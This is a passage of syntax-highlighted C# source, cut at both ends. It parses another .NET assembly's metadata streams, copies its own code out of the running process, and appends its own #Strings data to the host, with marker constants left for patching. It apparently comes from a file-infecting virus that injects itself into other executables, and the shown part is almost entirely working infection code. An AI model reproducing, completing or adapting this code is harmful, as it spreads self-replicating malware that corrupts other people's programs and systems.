                                        </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc1">/* check if #~ stream (can be any order) */</span><span class="sc0">

                                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x00ffffff</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x00007e23</span><span class="sc10">)</span><span class="sc0">
                                        </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc1">/* must have 16-bit heapsizes,
                                               and AssemblyRefs, Assemblys, StandAloneSigs, MemberRefs, Methods, TypeRefs
                                               Int64 class does not support &amp; operator
                                               and not worth finding how to implement it
                                               so we use two reads for the 36 bits that we need
                                            */</span><span class="sc0">

                                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((((</span><span class="sc11">heapsizes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rootold</span><span class="sc10">[</span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* 7 == HEAP_BLOB_4 | HEAP_GUID_4 | HEAP_STRING_4 */</span><span class="sc0">
                                             </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x00020442</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0x00020442</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* 20442 == StandAloneSigs | MemberRefs | Methods | TypeRefs */</span><span class="sc0">
                                             </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">rootold</span><span class="sc10">[</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x09</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0x09</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* 9 == AssemblyRefs | Assemblys */</span><span class="sc0">
                                               </span><span class="sc10">)</span><span class="sc0">
                                            </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc10">}</span><span class="sc0">

                                            </span><span class="sc11">schemaind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0">

                                        </span><span class="sc1">/* check if #Strings stream */</span><span class="sc0">

                                        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x73676e69</span><span class="sc10">)</span><span class="sc0">
                                              </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x72745323</span><span class="sc10">)</span><span class="sc0">
                                              </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">[</span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                                </span><span class="sc10">)</span><span class="sc0">
                                        </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc1">/* check that combined #Strings stream &lt; 64kb */</span><span class="sc0">

                                            </span><span class="sc1">/* variable 0: size of our #Strings stream */</span><span class="sc0">

                                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x00626772</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0xffff</span><span class="sc10">)</span><span class="sc0">
                                            </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc10">}</span><span class="sc0">

                                            </span><span class="sc11">stringsind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0">

                                        </span><span class="sc1">/* check if #Blob stream */</span><span class="sc0">

                                        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x6f6c4223</span><span class="sc10">)</span><span class="sc0">
                                              </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">Int16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rva</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x0062</span><span class="sc10">)</span><span class="sc0">
                                                </span><span class="sc10">)</span><span class="sc0">
                                        </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0">

                                        </span><span class="sc1">/* find end of stream name */</span><span class="sc0">

                                        </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">[</span><span class="sc11">strbase</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
                                        </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc0">
                                    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">streams</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                    </span><span class="sc1">/* skip persisted dword, if present */</span><span class="sc0">

                                    </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">heapsizes</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">

                                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">schemaind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                     </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stringsind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* sanity check */</span><span class="sc0">
                                     </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">    </span><span class="sc1">/* sanity check */</span><span class="sc0">
                                       </span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc11">Byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc10">;</span><span class="sc0">
                                        </span><span class="sc11">Int32</span><span class="sc0">  </span><span class="sc11">hdroff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">baseind</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc1">/* variable 1: our #~ stream size (TypeRefs + MemberRefs + StandAloneSig) + our #Strings stream size */</span><span class="sc0">

                                        </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Byte</span><span class="sc10">[(</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">rootsize</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[--</span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x01626772</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">4</span><span class="sc10">)],</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hdroff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">

                                        </span><span class="sc10">--</span><span class="sc11">schemaind</span><span class="sc10">;</span><span class="sc0">
                                        </span><span class="sc10">--</span><span class="sc11">stringsind</span><span class="sc10">;</span><span class="sc0">
                                        </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc5">do</span><span class="sc0">
                                        </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc1">/* place constant streams at front of array */</span><span class="sc0">

                                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">schemaind</span><span class="sc10">)</span><span class="sc0">
                                             </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">stringsind</span><span class="sc10">)</span><span class="sc0">
                                             </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">blobind</span><span class="sc10">)</span><span class="sc0">
                                               </span><span class="sc10">)</span><span class="sc0">
                                            </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">copysize</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">baseind</span><span class="sc10">];</span><span class="sc0">
                                                </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hdroff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">copysize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc10">);</span><span class="sc0">
                                                </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">]);</span><span class="sc0">

                                                </span><span class="sc1">/* update stream offset */</span><span class="sc0">

                                                </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hdroff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc10">);</span><span class="sc0">
                                                </span><span class="sc11">hdroff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">copysize</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc10">}</span><span class="sc0">

                                            </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0">
                                        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">strcpy</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc11">Byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">codecopy</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc1">/* make local copy of our code */</span><span class="sc0">

                                        </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">ourbase</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc1">/* variable 2: size of our code
                                           variable 3: RVA of our code
                                        */</span><span class="sc0">

                                        </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">ReadIntPtr</span><span class="sc10">((</span><span class="sc11">ourbase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Process</span><span class="sc10">.</span><span class="sc11">GetCurrentProcess</span><span class="sc10">().</span><span class="sc11">MainModule</span><span class="sc10">.</span><span class="sc11">BaseAddress</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x03626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">codecopy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Byte</span><span class="sc10">[</span><span class="sc4">0x02626772</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x02626772</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc1">/* copy host #Strings stream */</span><span class="sc0">

                                        </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">stringsind</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hdroff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x14</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">stringsind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">stringsind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">]);</span><span class="sc0">

                                        </span><span class="sc1">/* append our #Strings stream to host #Strings stream */</span><span class="sc0">

                                        </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">stroff</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc1">/* variable 4: RVA of our #Strings stream
                                           variable 0: size of our #Strings stream
                                        */</span><span class="sc0">

                                        </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">ReadIntPtr</span><span class="sc10">(</span><span class="sc11">ourbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x04626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">stroff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x00626772</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc1">/* variable 5: previous host #Strings stream size */</span><span class="sc0">

                                        </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">stringsdelta</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x05626772</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc1">/* variable 6: RVA in our code of variable 5 */</span><span class="sc0">

                                        </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x06626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc1">/* update host #Strings stream offset and size */</span><span class="sc0">

                                        </span><span class="sc1">/* variable 0: size of our #Strings stream */</span><span class="sc0">

                                        </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt64</span><span class="sc10">(</span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hdroff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">Int64</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x00626772</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc11">hdroff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">0x14</span><span class="sc10">;</span><span class="sc0">
                                        </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc1">/* update host #~ stream offset and size */</span><span class="sc0">

                                        </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">schemaind</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hdroff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc1">/* variable 7: size of our TypeRefs + MemberRefs + StandAloneSig */</span><span class="sc0">

                                        </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt64</span><span class="sc10">(</span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hdroff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">Int64</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">schemaind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x07626772</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc11">hdroff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc1">/* parse host #~ stream */</span><span class="sc0">

                                        </span><span class="sc11">valid</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt64</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">schemaind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x1c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x14</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc1">/* calculate number of bytes before host TypeRefs */</span><span class="sc0">

                                        </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">skip1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc1">/* calculate number of bytes between host TypeRefs and Methods */</span><span class="sc0">

                                        </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">6</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">14</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">skip2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

